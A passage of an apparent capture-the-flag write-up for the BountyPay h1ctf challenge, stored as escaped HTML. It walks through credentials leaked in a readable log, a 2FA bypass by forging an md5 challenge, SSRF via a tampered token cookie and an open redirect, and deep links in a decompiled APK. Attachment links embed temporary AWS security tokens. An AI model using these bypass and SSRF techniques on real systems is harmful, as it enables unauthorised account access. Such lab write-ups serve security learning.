class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;PARAMS\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e   \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003efile_put_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bp_web_trace.log\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;U\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003eFILE_APPEND\u003c/span\u003e   \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003efound that it logs the POST and GET variables to the log file \u003cstrong\u003ebp_web_trace.log\u003c/strong\u003e which is in htdocs and can be accessed through server \u003ca title=\"https://app.bountypay.h1ctf.com/bp_web_trace.log\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fbp_web_trace.log\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/bp_web_trace.log\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBy base64 decoding we can get the first four requests of the server\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:[]}}\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;}}}\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;,\u0026quot;challenge_answer\u0026quot;:\u0026quot;bD83Jk27dQ\u0026quot;}}}\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/statements\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:{\u0026quot;month\u0026quot;:\u0026quot;04\u0026quot;,\u0026quot;year\u0026quot;:\u0026quot;2020\u0026quot;},\u0026quot;POST\u0026quot;:[]}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing that creds we can login into the app.bountypay.h1ctf.com which has an 2FA check.\u003cbr\u003e\nThere is no session management, 2FA code is validated using the challenge parameter so 2FA is validated using some relation ship between challenge and challenge_answer.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\n\nusername=brian.oliver\u0026amp;password=V7h0inzX\u0026amp;challenge=4810310b2c844799dc9c9d46d3838192\u0026amp;challenge_answer=fake\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSeems like the \u003ccode\u003echallenge == md5(challenge_answer)\u003c/code\u003e, tried that one \u003ccode\u003echallenge=144c9defac04969c7bfad8efaa8ea194\u0026amp;challenge_answer=fake\u003c/code\u003e\u003cbr\u003e\nWorked : )    -   Successfully logged into app.app.bountypay.h1ctf.com\u003c/p\u003e\n\n\u003ch1 id=\"level-2\"\u003eLevel - 2 ::\u003c/h1\u003e\n\n\u003cp\u003eAfter login into the \u003cstrong\u003eapp.bountypay.h1ctf.com\u003c/strong\u003e, it gives a \u003cstrong\u003edashboard\u003c/strong\u003e where we can \u003cstrong\u003eload transactions based on month, year and pay them\u003c/strong\u003e.\u003cbr\u003e\nThe brian.oliver is the owner of BountyPayHQ , searched for all months and years, no use, there are no payments for that account.\u003cbr\u003e\nBut while loading transactions :\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_from_2020-06-09_00-07-18.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hws3ehRBmJhJHBxZ4rkU6v6s?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_00-07-18.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_00-07-18.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=bf3dc97ec9b8abefd26527c37b65b2c9906c31370722cd9948408128976355b1\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hws3ehRBmJhJHBxZ4rkU6v6s?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_00-07-18.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_00-07-18.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=bf3dc97ec9b8abefd26527c37b65b2c9906c31370722cd9948408128976355b1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nIt giving a \u003cstrong\u003eurl of  api to get the result\u003c/strong\u003e and \u003cstrong\u003eresult data\u003c/strong\u003e in the json.\u003cbr\u003e\nThe server is \u003cstrong\u003einternally requesting the api\u003c/strong\u003e for the result. we can achieve \u003cstrong\u003eSSRF\u003c/strong\u003e if we have control over the url.\u003cbr\u003e\nURL : \u003ccode\u003ehttps://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=07\u0026amp;year=2020\u003c/code\u003e\u003cbr\u003e\nThere is no use of \u003cstrong\u003emonth and year values\u003c/strong\u003e as they are in the \u003cstrong\u003equery part\u003c/strong\u003e, but after observing the base64 cookie found that the account id \u003cstrong\u003eF8gHiqSdpK\u003c/strong\u003e has been taken from \u003cstrong\u003etoken cookie\u003c/strong\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ echo eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d\n{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs we have control over account_id, the injection is in url path, so we can control path over that domain api.bountypay.h1ctf.com only : (.\u003c/p\u003e\n\n\u003cp\u003eAfter visiting the \u003ca href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehome page\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e found that there is an redirect at \u003ca title=\"https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DREST%2BAPI\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nurl has an \u003cstrong\u003ewhitelist check\u003c/strong\u003e, but it is accepting \u003ca title=\"https://software.bountypay.h1ctf.com/\" href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://software.bountypay.h1ctf.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, which is not accessable globally. \u003cbr\u003e\nTried accessing it using ssrf : \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"Screenshot_from_2020-06-09_00-22-24.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iN7hZGUJz8C2otZQdHxiXeFP?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_00-22-24.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_00-22-24.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=d84c4120aaa7057e6a9c6754c3f2793e92f1da0e95c7dd3462763a10c707fbd9\" data-attachment-type=\"image/png\"\u003eScreenshot_from_2020-06-09_00-22-24.png (F859521)\u003c/a\u003e\u003cbr\u003e\nIt has a login page same as app.bountypay.h1ctf.com , tried sending post params in get etc, nothing worked.\u003cbr\u003e\nAfter that tried directory brute force using that ssrf, found uploads directory on \u003ca title=\"https://software.bountypay.h1ctf.com/\" href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://software.bountypay.h1ctf.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Index of /uploads/\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\n\u0026lt;body bgcolor=\u0026quot;white\u0026quot;\u0026gt;\n\u0026lt;h1\u0026gt;Index of /uploads/\u0026lt;/h1\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;a href=\u0026quot;../\u0026quot;\u0026gt;../\u0026lt;/a\u0026gt;\n\u0026lt;a href=\u0026quot;/uploads/BountyPay.apk\u0026quot;\u0026gt;BountyPay.apk\u0026lt;/a\u0026gt;                                        20-Apr-2020 11:26              4043701\n\u0026lt;/pre\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFound the apk on the uploads folder, the files has no restrictions for IP. so downloaded it normally \u003ca title=\"https://software.bountypay.h1ctf.com/uploads/BountyPay.apk\" href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuploads%2FBountyPay.apk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://software.bountypay.h1ctf.com/uploads/BountyPay.apk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e .  Apk file : \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"BountyPay.apk\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vYLRoViQdgeoVx21eJrRW7By?response-content-disposition=attachment%3B%20filename%3D%22BountyPay.apk%22%3B%20filename%2A%3DUTF-8%27%27BountyPay.apk\u0026amp;response-content-type=application%2Fvnd.android.package-archive\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=17adceaeed48b0c53b31b3af70bcb24e831f4a22e6ab7f5275cc883078f6a477\" data-attachment-type=\"application/vnd.android.package-archive\"\u003eBountyPay.apk (F859556)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"level-3\"\u003eLevel - 3 ::\u003c/h1\u003e\n\n\u003cp\u003eDecompiled the Apk into java files\u003cbr\u003e\nAnd found that Three challenges in Apk (PartOneActivity.java, PartTwoActivity.java , PartThreeActicity.java).\u003cbr\u003e\nFor each activity there is a deep link, the challenges are just fullfill conditions using deeplinks\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:theme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@style/AppTheme.NoActionBar\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@string/title_activity_part_three\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bounty.pay.PartThreeActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;intent-filter\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.action.VIEW\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.DEFAULT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.BROWSABLE\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;three\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:host=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;part\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:theme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@style/AppTheme.NoActionBar\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@string/title_activity_part_two\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bounty.pay.PartTwoActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan 